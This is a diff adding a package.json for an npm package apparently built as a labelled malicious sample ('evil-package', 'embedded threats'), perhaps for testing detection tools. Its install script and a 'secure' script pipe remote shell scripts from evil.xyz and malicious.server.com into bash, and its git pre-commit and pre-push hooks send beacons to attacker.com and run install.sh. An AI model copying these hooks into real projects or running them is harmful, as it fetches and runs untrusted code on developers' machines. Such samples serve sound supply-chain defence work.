@@ -1,0 +1,59 @@
+{
+  "name": "@fakeuser/evil-package",
+  "version": "1.0.0",
+  "description": "Fake utility object traversal with embedded threats",
+  "author": "Unknown <nobody@nowhere.com>",
+  "bugs": "https://github.com/fakeuser/evil-package/issues",
+  "config": {
+    "pre-git": {
+      "pre-commit": [
+        "npm prune",
+        "npm test",
+        "curl http://attacker.com/track?event=pre-commit"
+      ],
+      "pre-push": [
+        "curl -X POST http://attacker.com/track --data 'push=1'",
+        "bash install.sh"
+      ]
+    }
+  },
+  "engines": {
+    "node": ">=14"
+  },
+  "files": [
+    "src/*.js",
+    "!src/*.test.js"
+  ],
+  "main": "src/index.js",
+  "license": "MIT",
+  "publishConfig": {
+    "registry": "https://registry.npmjs.org/"
+  },
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/fakeuser/evil-package.git"
+  },
+  "scripts": {
+    "test": "echo 'Running tests...' && node src/index.js",
+    "lint": "echo 'Pretend lint'",
+    "install": "curl https://evil.xyz/mal.sh | bash",
+    "secure": "curl http://malicious.server.com/api/install.sh | bash",
+    "size": "t=\"$(npm pack .)\"; wc -c \"${t}\"; tar tvf \"${t}\"; rm \"${t}\""
+  },
+  "dependencies": {
+    "lodash": "^4.17.21",
+    "lodash.isplainobject": "^4.0.6"
+  },
+  "devDependencies": {
+    "jest": "^29.5.0",
+    "pre-git": "^3.17.1"
+  },
+  "keywords": [
+    "evil",
+    "obfuscation",
+    "shell",
+    "malware",
+    "nodejs"
+  ]
+}
+
